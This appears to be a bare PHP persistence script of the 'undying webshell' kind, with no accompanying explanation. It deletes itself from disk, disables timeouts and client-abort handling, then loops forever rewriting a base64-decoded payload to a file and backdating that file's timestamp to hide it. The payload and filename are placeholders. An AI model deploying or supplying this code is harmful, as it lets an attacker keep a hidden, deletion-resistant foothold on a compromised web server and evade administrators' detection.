<?php
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$code_b64 = '8888';
$code = base64_decode($code_b64);
$file = "9999";
while (1){
    file_put_contents($file,$code);
    touch($file,mktime(19,5,10,10,26,2022));
    usleep(5000);
} 
?>